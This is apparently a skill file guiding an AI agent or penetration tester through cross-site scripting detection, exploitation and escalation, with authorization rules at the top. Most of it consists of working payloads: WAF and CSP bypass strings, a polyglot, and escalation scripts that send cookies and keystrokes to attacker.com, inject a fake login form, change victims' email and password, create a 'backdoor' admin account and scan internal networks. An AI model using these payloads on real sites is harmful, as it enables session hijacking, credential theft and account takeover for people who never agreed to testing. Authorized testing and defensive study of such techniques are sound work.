# Cross-Site Scripting (XSS) Skill

## Overview
Complete methodology for detecting, exploiting, and escalating XSS vulnerabilities.
Covers Reflected, Stored, DOM-based, and Blind XSS with WAF bypass techniques,
escalation paths to account takeover and RCE, and evidence capture.

## Scope Rules
1. Only operate on explicitly in-scope applications and parameters.
2. External targets: exploitation beyond proof-of-execution requires explicit authorization.
3. Use non-destructive payloads (alert/console.log) for initial proof.
4. Stored XSS tests require explicit authorization and cleanup plan.
5. Never exfiltrate real user data without authorization.

---

## Phase 1: Detection — Finding XSS Injection Points

### 1.1 Input Discovery
Map every user-controllable input:
- **URL parameters:** `?search=test&page=1`
- **URL fragments:** `#section=value` (DOM-based)
- **POST body fields:** forms, JSON, XML
- **HTTP headers reflected in page:** `Referer`, `User-Agent`, `X-Forwarded-For`
- **File upload filenames:** Sometimes reflected in responses
- **URL path segments:** `/user/NAME/profile`

### 1.2 Reflection Analysis
For each input, check where/how it's reflected in the response:

```
Context 1: HTML body        → <div>USER_INPUT</div>
Context 2: HTML attribute   → <input value="USER_INPUT">
Context 3: JavaScript       → var x = 'USER_INPUT';
Context 4: URL/href         → <a href="USER_INPUT">
Context 5: CSS              → style="color: USER_INPUT"
Context 6: Inside comment   → <!-- USER_INPUT -->
Context 7: Not reflected    → Check DOM sources (JS assigns input to innerHTML)
```

### 1.3 Encoding Detection
Inject test strings to see what encoding is applied:
```
Test string: <script>alert(1)</script>
If reflected as: &lt;script&gt;alert(1)&lt;/script&gt;  → HTML entity encoded
If reflected as: <script>alert(1)</script>                → NO encoding (vulnerable!)
If reflected as: \x3cscript\x3ealert(1)\x3c/script\x3e  → JS hex encoded
If stripped entirely: input is filtered/sanitized
```

---

## Phase 2: XSS Types and Exploitation

### 2.1 Reflected XSS
Payload is in the URL/request and reflected back immediately.

**HTML Body Context:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<body onload=alert(document.domain)>
<marquee onstart=alert(document.domain)>
```

**HTML Attribute Context:**
```html
" onmouseover="alert(document.domain)
" onfocus="alert(document.domain)" autofocus="
"><script>alert(document.domain)</script>
' onmouseover='alert(document.domain)
```

**JavaScript Context:**
```javascript
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(document.domain)</script>
'-alert(document.domain)-'
\"-alert(document.domain)//
```

**URL/href Context:**
```
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

### 2.2 Stored XSS
Payload persisted in database, triggered when other users view the page.

**Common injection points:**
- User profile fields (name, bio, location)
- Comments/reviews
- Forum posts
- Support tickets
- File upload names
- Email subjects (webmail)

**Testing approach:**
1. Inject payload into storage point
2. Navigate to where the stored data is displayed
3. Check if payload executes
4. Clean up — remove the stored payload after testing

### 2.3 DOM-Based XSS
Payload never sent to server — processed entirely in client-side JavaScript.

**Common DOM Sources (where input comes from):**
```javascript
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
document.cookie
postMessage data
```

**Common DOM Sinks (where input is used unsafely):**
```javascript
element.innerHTML = ...
element.outerHTML = ...
document.write(...)
document.writeln(...)
eval(...)
setTimeout(userInput, ...)
setInterval(userInput, ...)
element.src = ...
element.href = ...
$.html(...)          // jQuery
$(userInput)         // jQuery selector injection
```

**Testing DOM XSS:**
```
# Fragment-based (never sent to server)
http://target/page#<img src=x onerror=alert(1)>

# If fragment is read by location.hash and written to innerHTML:
http://target/page#"><svg onload=alert(document.domain)>

# window.name (persists across navigations)
# Set window.name on attacker page, then navigate to target
```

### 2.4 Blind XSS
Payload executes in a context you can't directly observe (admin panel, log viewer, support dashboard).

**Payloads with callback:**
```html
<script src="https://YOUR_SERVER/xss.js"></script>
<img src=x onerror="fetch('https://YOUR_SERVER/blind?c='+document.cookie)">
"><script>new Image().src='https://YOUR_SERVER/blind?c='+document.cookie</script>
```

**Blind XSS platforms:**
- XSS Hunter (self-hosted or xsshunter.com)
- Interact.sh callbacks
- Burp Collaborator
- Custom webhook (webhook.site)

**Where to inject for blind XSS:**
- Contact forms (admin reads submissions)
- Support tickets
- User-Agent header (if logged and displayed in admin)
- Referer header
- Registration forms (admin user management panel)
- Error/feedback forms

---

## Phase 3: WAF Bypass Payloads

### 3.1 When `<script>` is Blocked
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<isindex type=image src=1 onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### 3.2 When Event Handlers are Blocked
```html
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
<form action="javascript:alert(1)"><button>click</button></form>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 3.3 When `alert` is Blocked
```javascript
confirm(1)
prompt(1)
console.log(document.domain)
document.location='http://attacker/'+document.cookie
fetch('http://attacker/'+document.cookie)
window.onerror=eval;throw'=alert\x281\x29'
self['al'+'ert'](1)
top[/al/.source+/ert/.source](1)
Reflect.apply(alert,window,[1])
[].constructor.constructor('alert(1)')()
```

### 3.4 SVG-Based Payloads
```html
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
<svg><image href="javascript:alert(1)">
<math><mtext><table><mglyph><svg xmlns="http://www.w3.org/2000/svg"><path onmouseover="alert(1)">
```

### 3.5 Encoding Bypass
```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Unicode escapes (in JS context) -->
\u0061\u006c\u0065\u0072\u0074(1)

<!-- Hex escapes (in JS context) -->
\x61\x6c\x65\x72\x74(1)

<!-- Octal (in some contexts) -->
\141\154\145\162\164(1)

<!-- URL encoding (in href context) -->
<a href="javascript:%61%6c%65%72%74(1)">click</a>

<!-- Base64 in data: URI -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
```

### 3.6 Mutation XSS (mXSS)
Exploits browser HTML parser behavior:
```html
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><svg xmlns="http://www.w3.org/2000/svg"><path onload="alert(1)">
```

### 3.7 Polyglot XSS Payload
Works across multiple contexts:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

---

## Phase 4: Escalation Paths

### 4.1 XSS → Cookie Theft → Session Hijacking
```javascript
// Steal cookies
new Image().src='https://attacker.com/steal?c='+document.cookie;

// Or via fetch
fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie));

// Then use stolen session cookie in attacker's browser
// Set cookie manually or use browser extension
```

**Note:** `HttpOnly` flag prevents JS access to cookies. Check:
```javascript
// If document.cookie is empty but user is logged in → HttpOnly is set
// Pivot to other escalation methods
```

### 4.2 XSS → Keylogging
```javascript
document.addEventListener('keypress', function(e) {
  new Image().src='https://attacker.com/keys?k='+e.key;
});
```

### 4.3 XSS → Credential Theft (Fake Login)
```javascript
// Inject fake login form
document.body.innerHTML='<h2>Session expired. Please login again.</h2>'+
  '<form action="https://attacker.com/phish" method="POST">'+
  '<input name="user" placeholder="Username"><br>'+
  '<input name="pass" type="password" placeholder="Password"><br>'+
  '<button>Login</button></form>';
```

### 4.4 XSS → CSRF (Perform Actions as Victim)
```javascript
// Change victim's email (account takeover path)
fetch('/api/profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
});

// Change victim's password
fetch('/api/change-password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'pwned123'}),
  credentials: 'include'
});

// Create admin user
fetch('/admin/api/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username:'backdoor',password:'pass123',role:'admin'}),
  credentials: 'include'
});
```

### 4.5 XSS → Internal Network Scanning
```javascript
// Port scan internal network from victim's browser
for(let i=1; i<=254; i++) {
  let img = new Image();
  img.onload = function() {
    fetch('https://attacker.com/found?ip=192.168.1.'+i);
  };
  img.src = 'http://192.168.1.'+i+':80/favicon.ico';
}
```

### 4.6 XSS → RCE Chains
1. **XSS → Admin panel → File upload → Webshell → RCE**
2. **XSS → Admin panel → Template editor → SSTI → RCE**
3. **XSS → Admin panel → Plugin install → Malicious plugin → RCE**
4. **XSS → SSRF (via victim's browser) → Internal service exploitation**

---

## Phase 5: Tools

### 5.1 dalfox — Automated XSS Scanner
```bash
# Basic scan
dalfox url "http://target/page?q=test"

# Scan with custom payloads
dalfox url "http://target/page?q=test" --custom-payload payloads.txt

# Pipe from parameter discovery
cat params.txt | dalfox pipe

# With blind XSS callback
dalfox url "http://target/page?q=test" --blind "https://YOUR_CALLBACK"

# JSON output for evidence parsing
dalfox url "http://target/page?q=test" --format json -o results.json

# Mining mode (discover params)
dalfox url "http://target/page" --mining-dict

# Crawl mode
dalfox url "http://target/" --crawl --crawl-depth 3
```

### 5.2 XSStrike
```bash
# Basic scan
python3 xsstrike.py -u "http://target/page?q=test"

# POST parameters
python3 xsstrike.py -u "http://target/page" --data "q=test"

# With cookies
python3 xsstrike.py -u "http://target/page?q=test" --headers "Cookie: session=abc"

# Crawl and test
python3 xsstrike.py -u "http://target/" --crawl

# Blind XSS
python3 xsstrike.py -u "http://target/page?q=test" --blind
```

### 5.3 Manual Testing Workflow
```
1. Map all parameters → Inject canary: xss<test>'"
2. Search response for canary → Identify context and encoding
3. Craft context-appropriate payload
4. Test payload → Verify execution
5. If blocked → Apply WAF bypass from Phase 3
6. Escalate → Cookie theft / CSRF / Account takeover
7. Document → Capture evidence
```

---

## Phase 6: CSP Bypass

### 6.1 Common CSP Weaknesses
```
# Allows unsafe-inline (XSS works normally)
Content-Security-Policy: default-src 'self' 'unsafe-inline'

# Allows unsafe-eval (eval/setTimeout XSS works)
Content-Security-Policy: script-src 'self' 'unsafe-eval'

# Allows CDN with JSONP endpoints
Content-Security-Policy: script-src cdn.example.com
→ Find JSONP endpoint on cdn.example.com, load arbitrary JS

# Allows data: URIs
Content-Security-Policy: script-src 'self' data:
→ <script src="data:text/javascript,alert(1)"></script>

# Missing on specific pages
→ Check all pages, CSP may not be applied uniformly
```

### 6.2 CSP Bypass Techniques
```html
<!-- Via whitelisted CDN JSONP -->
<script src="https://whitelisted-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- Via base tag hijack (if base-uri not restricted) -->
<base href="https://attacker.com/">
<!-- All relative script loads now come from attacker -->

<!-- Via nonce reuse/prediction -->
<!-- If nonce is static or predictable, include it -->
<script nonce="PREDICTED_NONCE">alert(1)</script>

<!-- Via DOM clobbering -->
<!-- Override variables used by CSP-trusted scripts -->
```

---

## Phase 7: Evidence Capture

### 7.1 Proof of Execution
Minimum evidence for XSS:
1. **Screenshot** of `alert(document.domain)` popup with URL bar visible
2. **Request/Response** pair showing injected payload and execution
3. **Browser console** output if using `console.log()`

### 7.2 Proof of Impact (for severity escalation)
- **Cookie extraction:** Screenshot showing `document.cookie` contents
- **Session hijack:** Demonstrate access to victim's session using stolen cookie
- **Account takeover:** Show ability to change email/password via XSS
- **Data theft:** Show ability to read sensitive page content

### 7.3 Evidence Commands
```javascript
// Use these for proof-of-concept (non-destructive)
alert(document.domain)           // Proves execution + shows domain
alert(document.cookie)           // Proves cookie access
console.log(document.domain)     // Silent proof (check console)
document.title = "XSS-PROOF"    // Visual proof without popup
```

---

## Decision Tree — Complete XSS Attack Flow

```
FOUND: User input reflected in page or processed by client-side JS
│
├─ Step 1: IDENTIFY CONTEXT
│  ├── HTML body → Try <script>alert(1)</script>
│  ├── HTML attribute → Try " onmouseover="alert(1)
│  ├── JavaScript string → Try ';alert(1)//
│  ├── URL/href → Try javascript:alert(1)
│  ├── DOM source (location.hash, etc.) → Test fragment injection
│  └── Not reflected → Check for blind XSS targets (admin panels)
│
├─ Step 2: TEST PAYLOAD
│  ├── Executes? → XSS confirmed! Document and escalate
│  └── Blocked?
│      ├── <script> filtered → Use event handlers (onerror, onload)
│      ├── Event handlers filtered → Use SVG, math, details tags
│      ├── alert() filtered → Use confirm(), prompt(), fetch()
│      ├── Tags filtered → Try JS context breakout
│      ├── Encoding applied → Try encoding bypass
│      └── WAF blocking → Apply bypass techniques from Phase 3
│
├─ Step 3: CLASSIFY
│  ├── Reflected (in URL, single request) → Medium severity
│  ├── Stored (persisted, affects other users) → High severity
│  ├── DOM-based (client-side only) → Medium severity
│  └── Blind (executes in admin panel) → High severity
│
├─ Step 4: ESCALATE (if authorized)
│  ├── Steal cookies → Session hijack → Account takeover
│  ├── Inject fake login → Credential theft
│  ├── Perform actions as victim → CSRF chain
│  ├── Read sensitive page content → Data theft
│  └── Target admin panel → RCE chain
│
└─ Step 5: DOCUMENT
   ├── Payload used, context, execution proof
   ├── Impact demonstration
   ├── CSP headers (if present)
   └── Remediation recommendation
```

---

## Evidence Collection
1. `evidence.json` — parameter, context, payload, execution proof
2. `findings.json` — validated impact, CVSS, CSP status, remediation
3. Screenshots of execution and impact
4. dalfox/XSStrike output logs

## Evidence Consolidation
Use `parse_dalfox_json.py` to convert dalfox JSON/JSONL output into `evidence.json`.

## MITRE ATT&CK Mappings
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1189 — Drive-by Compromise
- T1185 — Browser Session Hijacking
- T1557 — Adversary-in-the-Middle (via XSS proxy)

## Deep Dives
Load references when needed:
1. XSS types and sinks: `references/types_and_sinks.md`
2. Safe payloads: `references/safe_payloads.md`
3. Context and encoding: `references/context_encoding.md`
4. CSP validation: `references/csp_validation.md`
5. WAF bypass payloads: `references/waf_bypass.md`
6. Escalation techniques: `references/escalation.md`
7. Explicit-only advanced actions: `references/explicit_only_advanced.md`

## Success Criteria
- XSS vulnerability confirmed with proof of execution
- Type classified (reflected/stored/DOM/blind)
- Context identified (HTML/attribute/JS/URL)
- CSP status documented
- Impact demonstrated (cookie theft, session hijack, or account takeover)
- Evidence captured with screenshots and request/response pairs
